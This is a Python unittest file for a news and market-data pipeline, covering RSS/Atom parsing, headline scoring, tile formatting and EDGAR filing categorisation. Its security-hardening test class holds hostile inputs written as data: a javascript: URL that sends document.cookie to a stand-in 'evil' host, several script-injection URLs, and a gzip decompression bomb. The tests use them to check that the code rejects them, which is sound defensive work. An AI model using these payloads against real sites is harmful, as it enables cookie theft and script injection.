#!/usr/bin/env python3
"""Regression tests for pipeline.py — the offline, pure parts.

Only functions that touch no network are exercised: feed parsing, item
selection/scoring, market-tile formatting and the small render helpers. The
fetching layer (fetch, try_yahoo, fred_*, build_data, main) is deliberately
untested rather than mocked into a fake internet.

Run:  python3 -m unittest discover tests
"""

import sys
import tempfile
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import pipeline  # noqa: E402
import smallcap  # noqa: E402


NOW = datetime(2026, 9, 15, 16, 0, 0, tzinfo=timezone.utc)


def item(title, link="https://example.com/a", published=NOW, weight=1.0,
         category="markets", source="Test Wire"):
    return {"title": title, "link": link, "source": source,
            "category": category, "published": published, "summary": "",
            "weight": weight}


RSS = """<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0"><channel>
  <title>Test Feed</title>
  <item>
    <title>Fed holds rates steady as inflation cools</title>
    <link>https://example.com/one</link>
    <pubDate>Mon, 15 Sep 2026 12:00:00 GMT</pubDate>
    <description>&lt;p&gt;Policymakers   kept   the target range unchanged.&lt;/p&gt;</description>
  </item>
  <item>
    <title></title>
    <link>https://example.com/untitled</link>
  </item>
</channel></rss>"""

ATOM = """<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <entry>
    <title>8-K - ACME WIDGETS INC (0001234567) (Filer)</title>
    <link rel="alternate" type="text/html" href="https://www.sec.gov/acme"/>
    <updated>2026-09-15T12:00:00-04:00</updated>
    <summary>Current report</summary>
  </entry>
  <entry>
    <title>SCHEDULE 13D - ACME WIDGETS INC (0001234567) (Subject)</title>
    <link rel="alternate" type="text/html" href="https://www.sec.gov/acme-13d"/>
    <updated>2026-09-15T12:00:00-04:00</updated>
  </entry>
</feed>"""

GOOGLE_NEWS = """<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0"><channel>
  <item>
    <title>Small caps rally into the close - Reuters</title>
    <link>https://news.google.com/x</link>
    <source url="https://reuters.com">Reuters</source>
  </item>
</channel></rss>"""


class FeedParsingTests(unittest.TestCase):

    def test_rss_items_are_parsed_and_untitled_entries_dropped(self):
        items = pipeline.parse_feed(RSS, "Test Feed", "economy", 1.5)
        self.assertEqual(len(items), 1)
        it = items[0]
        self.assertEqual(it["title"], "Fed holds rates steady as inflation cools")
        self.assertEqual(it["link"], "https://example.com/one")
        self.assertEqual(it["source"], "Test Feed")
        self.assertEqual(it["category"], "economy")
        self.assertEqual(it["weight"], 1.5)
        self.assertEqual(it["published"],
                         datetime(2026, 9, 15, 12, 0, tzinfo=timezone.utc))

    def test_html_is_stripped_and_whitespace_collapsed_in_summaries(self):
        items = pipeline.parse_feed(RSS, "Test Feed", "economy", 1.5)
        self.assertEqual(items[0]["summary"],
                         "Policymakers kept the target range unchanged.")

    def test_atom_entries_use_the_alternate_link_href(self):
        items = pipeline.parse_feed(ATOM, "SEC EDGAR", "filings", 1.0)
        self.assertEqual(len(items), 2)
        self.assertEqual(items[0]["link"], "https://www.sec.gov/acme")
        self.assertEqual(items[0]["published"],
                         datetime(2026, 9, 15, 16, 0, tzinfo=timezone.utc))

    def test_google_news_titles_lose_the_appended_outlet_name(self):
        items = pipeline.parse_feed(GOOGLE_NEWS, "Google News Business", "top", 1.0)
        self.assertEqual(items[0]["title"], "Small caps rally into the close")
        self.assertEqual(items[0]["source"], "Reuters")

    def test_malformed_xml_raises_so_the_caller_can_record_the_feed_error(self):
        with self.assertRaises(Exception):
            pipeline.parse_feed("<rss><channel>", "Test", "top", 1.0)

    def test_dates_parse_from_rfc822_iso_and_naive_forms(self):
        self.assertEqual(pipeline._parse_date("Mon, 15 Sep 2026 08:00:00 -0400"),
                         datetime(2026, 9, 15, 12, 0, tzinfo=timezone.utc))
        self.assertEqual(pipeline._parse_date("2026-09-15T12:00:00Z"),
                         datetime(2026, 9, 15, 12, 0, tzinfo=timezone.utc))
        self.assertEqual(pipeline._parse_date("2026-09-15T12:00:00"),
                         datetime(2026, 9, 15, 12, 0, tzinfo=timezone.utc))
        self.assertIsNone(pipeline._parse_date("sometime last week"))
        self.assertIsNone(pipeline._parse_date(""))

    def test_long_summaries_are_cut_on_a_word_boundary(self):
        text = "word " * 100
        out = pipeline._clean_summary(text, limit=20)
        self.assertTrue(out.endswith("…"))
        self.assertLessEqual(len(out), 21)


class SelectionTests(unittest.TestCase):

    def test_classify_prefers_the_earliest_matching_bucket(self):
        # crypto beats economy beats global beats companies
        self.assertEqual(pipeline.classify("Bitcoin ETF inflows hit a record"), "crypto")
        self.assertEqual(pipeline.classify("China tariffs lift inflation fears"), "economy")
        self.assertEqual(pipeline.classify("China earnings season disappoints"), "global")
        self.assertEqual(pipeline.classify("Acme earnings top estimates"), "companies")
        self.assertEqual(pipeline.classify("Quiet day for small caps"), "markets")

    def test_score_rewards_keywords_and_source_weight_and_decays_by_age(self):
        plain = pipeline.score(item("A quiet stretch for regional bakeries"), NOW)
        self.assertAlmostEqual(plain, 1.0)
        weighted = pipeline.score(
            item("A quiet stretch for regional bakeries", weight=2.0), NOW)
        self.assertAlmostEqual(weighted, 2.0)
        keyworded = pipeline.score(item("Inflation cools again"), NOW)
        self.assertAlmostEqual(keyworded, 6.0)          # 1.0 + 5 for "inflation"
        aged = pipeline.score(
            item("A quiet stretch for regional bakeries",
                 published=NOW - timedelta(hours=8)), NOW)
        self.assertAlmostEqual(aged, 0.5)               # halves every 8 hours

    def test_prepare_items_drops_stale_short_and_linkless_entries(self):
        items = [
            item("A perfectly reasonable market headline"),
            item("Too old to matter now, really",
                 published=NOW - timedelta(hours=49)),
            item("Short one", link="https://example.com/s"),
            item("A headline with no link at all", link=""),
        ]
        out = pipeline.prepare_items(items, NOW)
        self.assertEqual([i["title"] for i in out],
                         ["A perfectly reasonable market headline"])

    def test_prepare_items_keeps_the_heaviest_copy_of_a_duplicate_story(self):
        # the fingerprint is the first ten words, so the suffix must not shift them
        title = ("Fed holds rates steady as inflation cools across the broader "
                 "economy this quarter")
        items = [item(title, link="https://a.example/1", weight=1.0, source="Wire"),
                 item(title + " and more", link="https://b.example/2",
                      weight=2.0, source="WSJ")]
        out = pipeline.prepare_items(items, NOW)
        self.assertEqual(len(out), 1)
        self.assertEqual(out[0]["source"], "WSJ")

    def test_prepare_items_sorts_by_score_and_resolves_the_top_bucket(self):
        items = [item("A quiet stretch for regional bakeries", category="top"),
                 item("Inflation and the jobs report dominate the week",
                      link="https://example.com/b", category="top")]
        out = pipeline.prepare_items(items, NOW)
        self.assertEqual(out[0]["display_category"], "economy")
        self.assertEqual(out[1]["display_category"], "markets")
        self.assertGreater(out[0]["score"], out[1]["score"])

    def test_theme_scan_counts_and_ranks_matching_headlines(self):
        items = [item("Fed rate decision looms"), item("Treasury yields climb"),
                 item("Bitcoin slips")]
        self.assertEqual(pipeline.theme_scan(items)[0],
                         {"theme": "Rates & the Fed", "count": 2})


class MarketFormattingTests(unittest.TestCase):

    def test_fmt_value_formats_each_instrument_kind(self):
        self.assertEqual(pipeline.fmt_value(42.53, "yield"), "4.25%")
        self.assertEqual(pipeline.fmt_value(1.0856, "fx"), "1.0856")
        self.assertEqual(pipeline.fmt_value(1234.5, "dollar"), "$1,234.50")
        self.assertEqual(pipeline.fmt_value(67890.4, "crypto"), "$67,890")
        self.assertEqual(pipeline.fmt_value(5432.109, "index"), "5,432.11")
        self.assertEqual(pipeline.fmt_value(18.2, "level"), "18.20")

    def test_yield_tiles_report_basis_points_and_others_report_percent(self):
        y = pipeline.make_tile("10-yr Treasury", "^TNX", "yield", 42.5, 42.0, [])
        self.assertEqual(y["value_txt"], "4.25%")
        self.assertEqual(y["delta_txt"], "+5 bp")
        idx = pipeline.make_tile("S&P 500", "^GSPC", "index", 101.0, 100.0, [])
        self.assertEqual(idx["delta_txt"], "+1.00%")
        self.assertAlmostEqual(idx["delta"], 1.0)
        self.assertNotIn("asof", idx)
        self.assertEqual(
            pipeline.make_tile("Gold", "GC=F", "dollar", 1.0, 1.0, [],
                               asof="Sep 12")["asof"], "Sep 12")

    def test_tape_line_reads_out_the_instruments_it_has(self):
        tiles = [pipeline.make_tile("S&P 500", "^GSPC", "index", 101.0, 100.0, []),
                 pipeline.make_tile("WTI crude", "CL=F", "dollar", 63.0, 62.0, [])]
        self.assertEqual(pipeline.tape_line(tiles),
                         "S&P 500 +1.00%; WTI crude $63.00 (+1.61%).")
        self.assertEqual(pipeline.tape_line([]), "")


class RenderHelperTests(unittest.TestCase):

    def test_delta_class_and_arrow_treat_near_zero_as_flat(self):
        self.assertEqual(pipeline.delta_class(0.004), "flat")
        self.assertEqual(pipeline.delta_class(0.006), "up")
        self.assertEqual(pipeline.delta_class(-0.006), "down")
        self.assertEqual(pipeline.delta_arrow(0.0), "▬")

    def test_time_ago_switches_units_at_an_hour_and_a_day(self):
        self.assertEqual(pipeline.time_ago((NOW - timedelta(minutes=5)).isoformat(), NOW),
                         "5m ago")
        self.assertEqual(pipeline.time_ago((NOW - timedelta(hours=3)).isoformat(), NOW),
                         "3h ago")
        self.assertEqual(pipeline.time_ago((NOW - timedelta(days=2)).isoformat(), NOW),
                         "2d ago")
        self.assertEqual(pipeline.time_ago(NOW.isoformat(), NOW), "1m ago")
        self.assertEqual(pipeline.time_ago("", NOW), "")

    def test_market_cap_switches_to_billions_at_a_thousand_million(self):
        self.assertEqual(pipeline._fmt_mcap(999.4), "$999M")
        self.assertEqual(pipeline._fmt_mcap(1000.0), "$1.0B")
        self.assertEqual(pipeline._fmt_mcap(1750.0), "$1.8B")

    def test_sparkline_needs_two_points_and_escapes_nothing_odd(self):
        self.assertEqual(pipeline.spark_svg([]), "")
        self.assertEqual(pipeline.spark_svg([1.0]), "")
        svg = pipeline.spark_svg([1.0, 2.0, 3.0])
        self.assertTrue(svg.startswith("<svg class=\"spark\""))
        self.assertIn("polyline", svg)

    def test_flat_sparklines_do_not_divide_by_zero(self):
        self.assertIn("polyline", pipeline.spark_svg([5.0, 5.0, 5.0]))

    def test_escaping_covers_quotes_for_attribute_use(self):
        self.assertEqual(pipeline.esc('A & B "c" <d>'),
                         "A &amp; B &quot;c&quot; &lt;d&gt;")
        self.assertEqual(pipeline.esc(None), "")


class EdgarIntegrationTests(unittest.TestCase):
    """The one seam that matters between the two modules: EDGAR atom titles
    arrive from pipeline.parse_feed and are categorised by smallcap."""

    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.patch("_now", lambda: NOW)
        self.patch("CACHE_PATH", Path(tmp.name) / "smallcap.json")

    def patch(self, attr, value):
        original = getattr(smallcap, attr)
        setattr(smallcap, attr, value)
        self.addCleanup(setattr, smallcap, attr, original)

    def test_edgar_atom_titles_survive_the_trip_into_record_filings(self):
        cache = smallcap.load_cache()
        cache["profiles"]["ACME"] = {
            "mcap": 800.0, "shares": 20.0, "exch": "NASDAQ NMS - GLOBAL MARKET",
            "ind": "Technology", "name": "Acme Widgets Inc", "shist": [],
            "t": NOW.isoformat(timespec="seconds")}
        smallcap.save_cache(cache)

        parsed = pipeline.parse_feed(ATOM, "SEC EDGAR", "filings", 1.0)
        matched = smallcap.record_filings([
            {"title": f["title"], "link": f["link"],
             "published": f["published"].isoformat()} for f in parsed])

        self.assertEqual(matched, {"material": 1, "activist": 1, "offering": 0})
        store = smallcap.load_cache()["sec_filings"]
        self.assertEqual(store["material"]["ACME"]["form"], "8-K")
        self.assertEqual(store["activist"]["ACME"]["form"], "SCHEDULE 13D")
        self.assertEqual(store["material"]["ACME"]["link"],
                         "https://www.sec.gov/acme")


class UntrustedInputHardeningTests(unittest.TestCase):
    """Controls added after the Sep 2026 security review. Every one of these
    guards a path where text written by a stranger reaches the public page or
    the unattended runner."""

    def test_only_http_and_https_may_become_a_link(self):
        for good in ("https://example.com/a", "http://example.com/b",
                     "HTTPS://EXAMPLE.COM/c"):
            self.assertEqual(pipeline.safe_link(good), good)

    def test_script_bearing_urls_are_rejected(self):
        # escaping does NOT neutralise these: the browser decodes the entities
        # back before using the address, so the scheme must be checked instead
        for bad in ("javascript:fetch('https://evil/'+document.cookie)",
                    "JaVaScRiPt:alert(1)",
                    "data:text/html,<script>alert(1)</script>",
                    "vbscript:msgbox(1)", "  javascript:alert(1)  "):
            self.assertEqual(pipeline.safe_link(bad), "")

    def test_missing_or_unparseable_links_become_empty(self):
        for junk in (None, "", "   ", "http://[unclosed"):
            self.assertEqual(pipeline.safe_link(junk), "")

    def test_feed_items_carry_only_safe_links(self):
        xml = b"""<rss><channel>
          <item><title>Hostile headline about a company</title>
                <link>javascript:alert(1)</link></item>
          <item><title>Ordinary headline about a company</title>
                <link>https://example.com/ok</link></item>
        </channel></rss>"""
        items = pipeline.parse_feed(xml, "Src", "markets", 1.0)
        self.assertEqual([i["link"] for i in items], ["", "https://example.com/ok"])

    def test_titles_are_length_capped_at_ingest(self):
        # an uncapped title drives the filing-title regex into heavy backtracking
        xml = ("<rss><channel><item><title>" + "A - " * 5000
               + "</title><link>https://e.com</link></item></channel></rss>")
        items = pipeline.parse_feed(xml.encode(), "Src", "markets", 1.0)
        self.assertLessEqual(len(items[0]["title"]), pipeline.MAX_TITLE_CHARS)

    def test_summary_unescapes_before_stripping_tags(self):
        # the other order lets "&lt;script&gt;" survive as live markup
        self.assertNotIn("<script>",
                         pipeline._clean_summary("&lt;script&gt;alert(1)&lt;/script&gt;"))

    def test_oversized_decompression_is_refused(self):
        import zlib
        bomb = zlib.compressobj(9, zlib.DEFLATED, 16 + zlib.MAX_WBITS)
        blob = bomb.compress(b"\0" * (4 * 1024 * 1024)) + bomb.flush()
        with self.assertRaises(ValueError):
            pipeline._gunzip(blob, limit=1024)

    def test_normal_gzip_still_round_trips(self):
        import gzip as _gz
        self.assertEqual(pipeline._gunzip(_gz.compress(b"hello feed")), b"hello feed")

    def test_the_page_forbids_scripts(self):
        self.assertIn("default-src 'none'", pipeline.CSP)

    def test_error_text_never_carries_a_key(self):
        original = smallcap.read_key
        smallcap.read_key = lambda env, fname: "SECRETKEY1234567890"
        try:
            scrubbed = pipeline._scrub(
                "HTTP error for https://api/x?token=SECRETKEY1234567890")
            self.assertNotIn("SECRETKEY1234567890", scrubbed)
            self.assertIn("***", scrubbed)
        finally:
            smallcap.read_key = original


class VendorTypeConfusionTests(unittest.TestCase):
    """Vendor fields are written into a committed cache, so a bad type would
    persist across runs and raise on every later one."""

    def test_non_numeric_market_cap_does_not_put_a_company_in_band(self):
        for junk in ("1200", None, "", [], {}, True):
            self.assertFalse(smallcap.in_band({"mcap": junk, "exch": "NASDAQ"}))

    def test_a_valid_market_cap_still_qualifies(self):
        self.assertTrue(smallcap.in_band({"mcap": 800.0, "exch": "NASDAQ"}))

    def test_non_string_exchange_does_not_raise(self):
        self.assertTrue(smallcap.in_band({"mcap": 800.0, "exch": None}))

    def test_numbers_are_coerced_or_discarded(self):
        self.assertEqual(smallcap._num("1200"), 1200.0)
        self.assertEqual(smallcap._num(1200), 1200.0)
        for junk in ("abc", None, "", [], {}):
            self.assertIsNone(smallcap._num(junk))

    def test_text_fields_are_never_sliced_blindly(self):
        self.assertEqual(smallcap._txt(1234, 60), "1234")
        self.assertEqual(smallcap._txt(None, 60), "")
        self.assertEqual(smallcap._txt("abcdef", 3), "abc")


if __name__ == "__main__":
    unittest.main()
